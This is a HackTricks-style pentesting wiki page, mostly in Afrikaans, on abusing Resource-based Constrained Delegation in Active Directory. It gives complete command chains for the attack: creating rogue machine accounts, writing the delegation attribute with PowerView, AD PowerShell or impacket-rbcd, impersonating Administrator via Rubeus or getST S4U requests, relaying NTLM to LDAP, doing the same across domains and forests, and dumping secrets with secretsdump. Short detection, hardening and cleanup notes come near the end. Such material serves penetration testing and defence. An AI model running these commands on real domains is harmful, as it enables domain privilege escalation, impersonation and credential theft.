# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Basiese beginsels van Resource-based Constrained Delegation

Resource-based constrained delegation (RBCD) is soortgelyk aan [constrained delegation](constrained-delegation.md), maar die vertrouensrigting is omgekeer. Tradisionele constrained delegation teken aan na watter dienste 'n principal mag delegeer; RBCD teken op die **teikenhulpbron** aan watter principals gebruikers daarheen mag impersonate.<sup>[[12]](#references)</sup>

Die teikenobjek se _**msDS-AllowedToActOnBehalfOfOtherIdentity**_-attribuut bevat 'n security descriptor wat die principals identifiseer wat toegelaat word om namens ander identiteite teenoor daardie hulpbron op te tree.

Nog 'n belangrike verskil is dat 'n principal met voldoende **skryftoestemmings oor 'n masjienaccount** (`GenericAll`, `GenericWrite`, `WriteDacl`, `WriteProperty`, en soortgelyke regte) moontlik _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ kan instel. Die konfigurasie van tradisionele constrained delegation vereis normaalweg meer bevoorregte administratiewe toegang.<sup>[[1]](#references)</sup>

Meer presies: die wysiging van classic constrained-delegation-instellings word normaalweg deur `SeEnableDelegationPrivilege` op 'n domain controller beheer, 'n reg wat tipies deur hoogs bevoorregte administrators gehou word. RBCD verskuif die besluit na die teikenobjek se security descriptor, dus kan skryftoegang tot die relevante computer-object-eienskap voldoende wees sonder daardie gebruikersreg.<sup>[[1]](#references)[[2]](#references)</sup>

### Nuwe konsepte

Die **`TrustedToAuthForDelegation`**-flag in `userAccountControl` word dikwels as 'n voorvereiste vir **S4U2Self** beskryf, maar dit is onvolledig.\
'n Service principal met 'n SPN kan S4U2Self sonder die flag aanvra. Met `TrustedToAuthForDelegation` is die teruggestuurde service ticket **forwardable**; daarsonder is die ticket normaalweg **non-forwardable**.<sup>[[5]](#references)</sup>

Tradisionele constrained delegation verwerp 'n **non-forwardable TGS** in die S4U2Proxy-stap. RBCD kan daardie S4U2Self-ticket aanvaar wanneer die teiken se security descriptor die versoekende diens magtig.<sup>[[1]](#references)[[2]](#references)[[16]](#references)</sup>

### Aanvalstruktuur

> As jy **skryf-ekwivalente voorregte** oor 'n **computer account** het, kan jy moontlik bevoorregte toegang tot daardie masjien verkry.

Aanvaar dat die aanvaller reeds **skryf-ekwivalente voorregte oor die slagoffer se computer object** het.

1. Die aanvaller **kompromitteer** 'n account met 'n **SPN** of **skep een** ("Service A"). By verstek kan 'n geauthentiseerde domain user tot 10 computer objects skep, soos beheer deur **_MachineAccountQuota_**; 'n computer object verskaf outomaties bruikbare SPNs.
2. Die aanvaller **misbruik sy WRITE-voorreg** oor die slagoffer se computer (ServiceB) om **resource-based constrained delegation** te konfigureer sodat ServiceA enige user teenoor daardie slagoffercomputer (ServiceB) kan impersonate.
3. Die aanvaller gebruik Rubeus om 'n **volledige S4U-aanval** (S4U2Self en S4U2Proxy) vanaf Service A na Service B uit te voer vir 'n user **met bevoorregte toegang tot Service B**.
1. S4U2Self (vanaf die gekompromitteerde of geskepte SPN-account): versoek 'n **TGS wat Administrator teenoor Service A verteenwoordig** (non-forwardable).
2. S4U2Proxy: gebruik daardie **non-forwardable TGS** om 'n service ticket aan te vra wat **Administrator** teenoor die **slagofferhost** verteenwoordig.
3. Die non-forwardable ticket kan steeds in hierdie RBCD-vloei werk omdat Service A in die teikenhulpbron se security descriptor gemagtig is.
4. Die aanvaller kan die **ticket pass-the-ticket** en die user **impersonate** om **toegang tot die slagoffer se ServiceB** te verkry.<sup>[[1]](#references)</sup>

Om die _**MachineAccountQuota**_ van die domain na te gaan, kan jy die volgende gebruik:
```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Aanval

### Skep van 'n rekenaarobjek

Jy kan 'n rekenaarobjek binne die domein skep deur **[powermad](https://github.com/Kevin-Robertson/Powermad):**<sup>[[3]](#references)[[4]](#references)</sup>
```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Konfigurasie van Resource-based Constrained Delegation

**Deur die Active Directory PowerShell-module te gebruik**<sup>[[4]](#references)</sup>
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assign delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**Gebruik powerview**<sup>[[3]](#references)</sup>
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Voer ’n volledige S4U-aanval uit (Windows/Rubeus)

Eerstens het ons die nuwe Computer object met die wagwoord `123456` geskep, so ons benodig die hash van daardie wagwoord:<sup>[[3]](#references)[[4]](#references)</sup>
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
Dit sal die RC4- en AES-hashes vir daardie rekening druk.\
Nou kan die aanval uitgevoer word:<sup>[[3]](#references)[[4]](#references)</sup>
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Jy kan meer tickets vir meer dienste genereer deur net een keer te vra met die `/altservice`-parameter van Rubeus:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
> [!CAUTION]
> Gebruikers kan as **"Account is sensitive and cannot be delegated."** gemerk word. As daardie vlag geaktiveer is, kan die rekening nie deur hierdie delegation flow nageboots word nie. BloodHound stel hierdie eienskap tydens analysis bloot.

### Linux-nutsmiddels: end-tot-end RBCD met Impacket (2024+)

As jy vanaf Linux werk, kan jy die volledige RBCD chain met die amptelike Impacket-tools uitvoer:<sup>[[6]](#references)[[7]](#references)</sup>
```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```
Notes
- If LDAP signing/LDAPS enforced word, gebruik `impacket-rbcd -use-ldaps ...`.
- Verkies AES keys; baie moderne domains beperk RC4. Impacket en Rubeus ondersteun albei AES-only flows.
- Impacket kan die `sname` ("AnySPN") vir sommige tools herskryf, maar verkry die korrekte SPN waar moontlik (bv. CIFS/LDAP/HTTP/HOST/MSSQLSvc).

## Cross-domain & cross-forest RBCD

As die **delegating principal** wat jy beheer in ’n **ander domain** (of selfs ’n **ander forest**) as die **resource computer** woon, is die abuse steeds **RBCD**, maar die ticket flow is nie meer die gewone single-domain `S4U2Self -> S4U2Proxy` nie.

### Cross-domain RBCD: configureer die foreign principal volgens SID

Wanneer jy `msDS-AllowedToActOnBehalfOfOtherIdentity` vanuit ’n **ander domain** instel, kan die foreign machine/user moontlik **nie volgens naam resolveerbaar wees nie** in die target domain LDAP. In daardie geval, configureer die delegation entry deur die **SID** van die foreign principal te gebruik in plaas van sy sAMAccountName/UPN.

Dit is veral relevant wanneer NTLM na LDAP met `ntlmrelayx.py` gerelay word:<sup>[[9]](#references)</sup>
```bash
sudo ntlmrelayx.py -smb2support -t ldap://192.168.90.217 \
--no-dump --no-da --no-validate-privs \
--delegate-access \
--escalate-user S-1-5-21-3104832133-133926542-3798009529-1106 \
--sid
```
Notes:
- `--sid` sê vir `ntlmrelayx.py` om `--escalate-user` as 'n SID te behandel, wat vereis word wanneer die delegating account foreign aan die target domain is.
- Selfs al druk die tool `User not found in LDAP` uit, kan die delegation write steeds suksesvol wees omdat die security descriptor die foreign SID direk stoor.

### Cross-domain RBCD: cross-realm S4U sequence

Sodra die foreign principal in `msDS-AllowedToActOnBehalfOfOtherIdentity` is, is die werkende cross-domain flow:<sup>[[9]](#references)[[13]](#references)</sup>

1. Kry 'n **TGT** vir die delegating principal vanaf sy eie domain.
2. Versoek 'n **referral TGT** vir `krbtgt/<target-domain>`.
3. Versoek 'n **cross-realm S4U2Self referral** vir die user wat geïmpersoneer word op die target-domain DC.
4. Versoek die werklike **S4U2Self**-ticket vir daardie user terug in die delegator domain.
5. Voer **S4U2Proxy** in die delegator domain uit om 'n referral ticket vir die target domain te kry.
6. Voer die finale **S4U2Proxy** op die target-domain DC uit om die service ticket vir `cifs/host.target`, `host/host.target`, ens. te verkry.

Dit is waarom stock Linux tooling dikwels in cross-domain RBCD misluk:<sup>[[9]](#references)</sup>
- die request **realm** moet moontlik verskil van die realm van die TGT wat in die `TGS-REQ` gebruik word
- die chain benodig **independent S4U2Proxy steps**, nie slegs **S4U2Self** of **S4U2Self** wat onmiddellik deur 'n enkele **S4U2Proxy** gevolg word nie

### Cross-domain RBCD from Linux

Synacktiv het 'n Impacket `getST.py`-implementering gepubliseer wat die cross-realm sequence vanaf Linux reproduseer deur die twee KDCs eksplisiet te hanteer:<sup>[[9]](#references)[[11]](#references)</sup>
```bash
python3 ./getST.py dev.asgard.local/rbcd_test\$:R[...]5 -k \
-dc-ip 192.168.90.131 \
-targetdc 192.168.90.217 \
-targetdomain asgard.local \
-impersonate thor_adm \
-spn cifs/workstation.asgard.local

KRB5CCNAME=thor_adm@cifs_workstation.asgard.local@ASGARD.LOCAL.ccache \
./smbclient.py "asgard.local/thor_adm@workstation.asgard.local" \
-k -no-pass -dc-ip 192.168.90.217
```
Operasioneel is die nuwe arguments:
- `-dc-ip`: DC van die **domain wat delegasie uitvoer**
- `-targetdomain`: domain van die **resource computer**
- `-targetdc`: DC van die **resource** domain

### Cross-forest RBCD-beperkings

Cross-forest RBCD het ’n belangrike beperking: **die gebruiker wat geïmpersonifiseer word, moet aan dieselfde forest as die delegating principal behoort**. Met ander woorde, as jou beheerde masjienrekening in `valhalla.local` is en die teikenresource in `asgard.local` is, kan jy oor die algemeen **nie arbitrêre `asgard.local`-gebruikers via RBCD teenoor daardie resource impersonifiseer nie**.<sup>[[9]](#references)</sup>

Dit is steeds exploitable wanneer:
- die gebruiker in die **delegating forest** ’n **local admin** (of andersins bevoorreg) op die resource-host in die ander forest is
- ’n trust die vereiste authentication path toelaat en die vreemde SID in die teikencomputer se security descriptor aanvaar word

### Cross-forest RBCD-protokol-quirks

Cross-forest RBCD is nie bloot "cross-domain plus ’n trust" nie. Die waargenome flow sluit twee quirks in wat algemene tooling histories mis:<sup>[[9]](#references)</sup>

1. ’n Ekstra **S4U2Proxy**-request wat **`PA-PAC-OPTIONS=branch-aware`** stel
2. ’n Finale service ticket wat met **RC4** teruggestuur kan word, selfs wanneer ander etypes versoek is

Die praktiese flow is:

1. Kry ’n TGT vir die delegating principal in forest A.
2. Versoek **S4U2Self** vir die gebruiker wat in forest A geïmpersonifiseer moet word.
3. Versoek **S4U2Proxy** in forest A om ’n referral TGT vir forest B te verkry.
4. Stuur ’n tweede **S4U2Proxy** in forest A **sonder die S4U2Self-ticket as ’n additional ticket**, maar met `branch-aware` geaktiveer, om nog ’n referral TGT vir forest B te verkry.
5. Versoek opsioneel ’n normale service ticket in forest B vir die delegating principal (hierdie ticket word nie vir die finale abuse benodig nie).
6. Gebruik die referral tickets uit stappe 3 en 4 om die finale **S4U2Proxy**-ticket in forest B aan te vra vir die geïmpersonifiseerde forest-A-gebruiker teenoor die teiken-SPN.

### Cross-forest RBCD vanaf Linux

Dieselfde Synacktiv Impacket-branch voeg ’n `-forest` switch vir hierdie logika by:<sup>[[9]](#references)[[11]](#references)</sup>
```bash
python3 ./getST.py -spn 'cifs/workstation.asgard.local' \
-impersonate 'v_thor' \
-dc-ip VALHALLA.local \
valhalla.local/'desktop$' \
-targetdc ASGARD.local \
-targetdomain asgard.local \
-aesKey 4[...]f \
-forest
```
### Rekursiewe multi-domain RBCD (3+ domains)

In **multi-domain forests**, kan beide **S4U2Self** en **S4U2Proxy** **rekursief** wees in plaas daarvan om ná een referral te stop:

- **Rekursiewe S4U2Self**: die eerste `S4U2Self` word na die **geïmpersoneerde gebruiker se domain** gestuur, intermediêre ouer/kind-hops word met normale `TGS-REQ` referrals vir `krbtgt/<REALM>` deurkruis, en die **finale `S4U2Self`** word in die **delegating principal se eie domain** gestuur.
- Dit beteken dat die **besit van slegs 'n TGT** vir 'n machine account genoeg kan wees om 'n **admin van 'n ander domain in dieselfde forest** te impersonate en `cifs/host`, `host/host`, `wsman/host`, ens. aan te vra.
- **Rekursiewe S4U2Proxy** volg die trust chain op dieselfde manier: intermediêre hops hergebruik die vorige ticket as die TGT terwyl die volgende `krbtgt/<REALM>` referral aangevra word, en slegs die laaste hop lewer die finale service ticket.<sup>[[10]](#references)</sup>

'n Praktiese voorbeeld binne dieselfde forest is:
```bash
KRB5CCNAME=MIN-FRPERSO-01\$.ccache getST.py 'minus.sub.frperso.local/MIN-FRPERSO-01$' -k -no-pass \
-impersonate Administrator@frperso.local -self \
-altservice cifs/min-frperso-01.minus.sub.frperso.local

KRB5CCNAME=Administrator@frperso.local@cifs_min-frperso-01.minus.sub.frperso.local@MINUS.SUB.FRPERSO.LOCAL.ccache \
smbclient.py frperso.local/Administrator@min-frperso-01.minus.sub.frperso.local -k -no-pass
```
### SPN-less cross-domain / cross-forest RBCD

If the **delegating principal a user without an SPN is**, the last recursive `S4U2Self` fails with **`KDC_ERR_S_PRINCIPAL_UNKNOWN`**. The workaround is to **retry only the final hop as `S4U2Self+U2U`**.<sup>[[10]](#references)</sup>

Kort weergawe van die misbruikskakel:

1. Authenticate met die **NT hash** sodat die KDC na **RC4-HMAC (etype 23)** gestuur word.
2. Request eers **`-self -u2u`** en hou daardie ticket apart van die latere proxy-stap.
3. Extract die **TGT session key** met `describeTicket.py`.
4. Replace die gebruiker se **NT hash** met daardie **session key** deur `changepasswd.py -newhashes <session_key>` te gebruik.
5. Reuse die `S4U2Self+U2U`-ticket as die **`-additional-ticket`** tydens ’n aparte **`-proxy`**-request.
```bash
getST.py sub.frperso.local/Administrator -hashes ':<nthash>' \
-impersonate Administrator@frperso.local -self -u2u
describeTicket.py Administrator.ccache
changepasswd.py sub.frperso.local/Administrator@sub-frperso-01.sub.frperso.local \
-hashes ':<nthash>' -newhashes <tgt_session_key>
KRB5CCNAME=Administrator.ccache getST.py sub.frperso.local/Administrator -k -no-pass \
-impersonate Administrator@frperso.local -proxy -proxydomain frpublic.local \
-spn cifs/frpublic-01.frpublic.local -additional-ticket '<u2u_ticket.ccache>'
```
Operasionele voorbehoude:

- Wanneer die **eerste trusted hop reeds 'n ander forest is**, verkies die **branch-aware** algorithm (`getST.py ... -forest`) om by native Windows behavior te pas. As die foreign forest eers **later** in die chain bereik word, kan die non-branch-aware recursive flow steeds werk.<sup>[[9]](#references)</sup>
- Op onlangse **Windows Server 2022/2025** DCs kan geforseerde RC4 misluk met **`KDC_ERR_ETYPE_NOSUPP`** weens RC4-deprecation; dit kan **SPN-less RBCD** onmoontlik maak, al werk klassieke SPN-backed RBCD steeds met AES.<sup>[[15]](#references)</sup>
- Voer **`S4U2Self+U2U`** uit voordat die gebruiker se hash/password verander word: `SamrChangePasswordUser` herbereken nie die account se Kerberos AES keys nie, dus kan die verandering van die password eerste latere ticket requests breek.<sup>[[14]](#references)</sup>
- Die impersonated account moet steeds **delegable** wees: **Protected Users** en accounts met **`NOT_DELEGATED`** / **"Account is sensitive and cannot be delegated"** blokkeer die chain.

## Detection / hardening notes

- RBCD paths oor domains/forests word steeds gewoonlik deur **ACL abuse** of **relay-to-LDAP** geskep. Dwing **LDAP signing** en **LDAP channel binding** op DCs af om algemene setup paths te breek.
- Oudit wie `msDS-AllowedToActOnBehalfOfOtherIdentity` op computer objects kan skryf en resolve die gestoorde SIDs, insluitend **foreign security principals**.
- In trust-heavy environments, hersien **Selective Authentication**, **SID filtering**, en of users van 'n foreign forest **local admin**-regte op resource hosts het.

### Toegang verkry

Die laaste command line sal die **complete S4U attack uitvoer en die TGS** vanaf Administrator na die victim host in **memory** inject.\
In hierdie voorbeeld is 'n TGS vir die **CIFS** service vanaf Administrator aangevra, dus sal jy toegang tot **C$** hê:
```bash
ls \\victim.domain.local\C$
```
### Misbruik verskillende service tickets

Leer meer oor die [**beskikbare service tickets hier**](silver-ticket.md#available-services).

## Enumerasie, ouditering en opruiming

### Enumerasie van rekenaars met RBCD gekonfigureer

PowerShell (wat die SD dekodeer om SIDs op te los):
```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
ForEach-Object {
$raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
$sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
$sd.DiscretionaryAcl | ForEach-Object {
$sid  = $_.SecurityIdentifier
try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
[PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
}
}
```
Impacket (lees of spoel met een enkele opdrag):
```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```
### Opruim / stel RBCD terug

- PowerShell (maak die attribute leeg):
```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```
- Impacket:
```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```
## Kerberos-foute

- **`KDC_ERR_ETYPE_NOTSUPP`**: Dit beteken dat Kerberos opgestel is om nie DES of RC4 te gebruik nie, en jy verskaf slegs die RC4-hash. Verskaf ten minste die AES256-hash aan Rubeus (of verskaf net die rc4-, aes128- en aes256-hashes). Example: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** tydens `-self` vir ’n normale gebruiker: die delegerende principal het waarskynlik **geen SPN nie**. Probeer die **laaste hop** weer as **`S4U2Self+U2U`** in plaas van ’n gewone **`S4U2Self`**.<sup>[[10]](#references)</sup>
- **`KDC_ERR_ETYPE_NOSUPP`** tydens **SPN-less RBCD**: onlangse DCs kan die afgedwonge **RC4-HMAC**-pad verwerp wat deur die `S4U2Self+U2U` + session-key-substitution-truuk vereis word. Probeer eerder ’n klassieke **SPN-backed** RBCD-pad met AES.<sup>[[10]](#references)[[15]](#references)</sup>
- **`KRB_AP_ERR_SKEW`**: Dit beteken dat die tyd op die huidige rekenaar van dié van die DC verskil en dat Kerberos nie behoorlik werk nie.
- **`preauth_failed`**: Dit beteken dat die gegewe gebruikersnaam + hashes nie werk om aan te meld nie. Jy het dalk vergeet om die "$" binne die gebruikersnaam te plaas toe jy die hashes gegenereer het (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`**: Dit kan beteken:
- Die gebruiker wat jy probeer impersonate, kan nie toegang tot die verlangde diens verkry nie (omdat jy dit nie kan impersonate nie of omdat dit nie genoeg privileges het nie)
- Die gevraagde diens bestaan nie (as jy byvoorbeeld ’n ticket vir winrm vra, maar winrm nie loop nie)
- Die fakecomputer wat geskep is, het sy privileges oor die kwesbare server verloor en jy moet dit herstel.
- Jy abuse classic KCD; onthou dat RBCD met nie-forwardable S4U2Self-tickets werk, terwyl KCD forwardable vereis.

## Notas, relays en alternatiewe

- Jy kan ook die RBCD SD oor AD Web Services (ADWS) skryf as LDAP gefilter word. Sien:


{{#ref}}
adws-enumeration.md
{{#endref}}

- Kerberos relay chains eindig dikwels in RBCD om plaaslike SYSTEM in een stap te verkry. Sien praktiese end-to-end-voorbeelde:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- As LDAP signing/channel binding **disabled** is en jy ’n machine account kan skep, kan tools soos **KrbRelayUp** ’n coerced Kerberos-auth na LDAP relay, `msDS-AllowedToActOnBehalfOfOtherIdentity` vir jou machine account op die teikenrekenaarobjek stel, en onmiddellik **Administrator** via S4U vanaf off-host impersonate.<sup>[[8]](#references)</sup>

## References

- [1] [Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory](https://eladshamir.com/2019/01/28/Wagging-the-Dog.html)
- [2] [Another Word on Delegation – harmj0y](https://blog.harmj0y.net/redteaming/another-word-on-delegation/)
- [3] [Kerberos Resource-based Constrained Delegation: Computer Object Takeover](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [4] [Netwrix – Resource-Based Constrained Delegation Abuse](https://netwrix.com/en/resources/blog/resource-based-constrained-delegation-abuse/)
- [5] [Kerberosity Killed the Domain: An Offensive Kerberos Overview](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- [6] [Impacket rbcd.py (official)](https://github.com/fortra/impacket/blob/master/examples/rbcd.py)
- [7] [Quick Linux cheatsheet with recent syntax](https://tldrbins.github.io/rbcd/)
- [8] [0xdf – HTB Bruno (LDAP signing off → Kerberos relay to RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [9] [Synacktiv - Exploring cross-domain & cross-forest RBCD](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd.html)
- [10] [Synacktiv - Exploring cross-domain & cross-forest RBCD: part 2](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd-part-2.html)
- [11] [Synacktiv Impacket branch - cross_forest_rbcd](https://github.com/synacktiv/impacket/tree/cross_forest_rbcd)
- [12] [Microsoft Learn - Kerberos constrained delegation overview](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [13] [Microsoft Open Specifications - Cross-domain S4U2Self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/f35b6902-6f5e-4cd0-be64-c50bbaaf54a5)
- [14] [Microsoft Open Specifications - SamrChangePasswordUser](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/9699d8ca-e1a4-433c-a8c3-d7bebeb01476)
- [15] [Microsoft Learn - Detect and remediate RC4 usage in Kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)
- [16] [Microsoft Open Specifications – S4U2Proxy details](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/bde93b0e-f3c9-4ddf-9cd5-e9c237331c90)
{{#include ../../banners/hacktricks-training.md}}
